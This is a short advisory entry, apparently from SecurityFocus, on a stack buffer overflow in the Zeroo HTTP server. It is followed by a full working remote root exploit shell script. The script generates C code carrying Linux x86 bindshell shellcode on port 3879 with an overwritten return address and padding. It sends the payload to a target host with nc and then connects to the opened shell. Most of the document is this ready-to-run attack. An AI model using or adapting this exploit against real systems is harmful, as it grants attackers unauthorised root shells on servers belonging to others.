source: http://www.securityfocus.com/bid/6190/info

Zeroo HTTP server is a freely available, open source web server. It is available for the Linux and Microsoft Windows platforms.

It has been reported that Zeroo HTTP server does not sufficiently check bounds on some requests. This occurs when a string of excessive length is received by the server. This can result in the overwriting of stack memory, and potential code execution. 

#!/bin/sh
#
# 0x82-Zer00.sh Zeroo HTTP Server Remote root exploit for Linux
#
# __
# exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
# My World: http://x82.i21c.net
#
(printf "\n 0x82-Zer00.sh Zeroo HTTP Server Remote root exploit");
(printf "\n                                by x82 in INetCop(c)\n\n");
#
if [ "$2" = "" ]; then
(printf " Usage: 0x82-Zer00.sh [hostname] [port]\n\n");
exit; fi
#
cat >0x82-Remote-Zeroosubugxpl.c<< X82X82
#define Xpl017Elz x82
int main(/* args? */) {
    int num;
    char b1ndsh[] = /* Linux(x86) bindshell on port 3879 */
        "\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
        "\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
        "\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
        "\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
        "\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
        "\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
        "\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
        "\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";
    for(num=0;num<0xa4;num+=4)
        printf("\xc0\xf4\xff\xbf"); // this's &shellcode
    for(num=0;num<0x02a8-strlen(b1ndsh);num++)
        printf("N"); /* nop...NNNNNNNNNNNNN...NNNNNNNNNNNNN;;; */
    printf("%s",b1ndsh); /* shellcode */
    for(num=0;num<0xb4;num++)
    printf("\xff"); /* byteother */
    printf("\r\n");
}
X82X82
#
(printf " { 0x00. Compile exploit. }\n");
make 0x82-Remote-Zeroosubugxpl
(printf " { 0x01. Send code ! }\n");
(./0x82-Remote-Zeroosubugxpl;cat)|nc $1 $2 &
(printf " { 0x02. OK, Try $1:3879 ... }\n");
nc $1 3879
(printf " { 0x03. Connection closed. }\n");
#
(printf " { 0x04. Delete exploit code. }\n");
rm -f 0x82-Remote-Zeroosubugxpl*
(printf " { 0x05. End :-}\n\n");
#
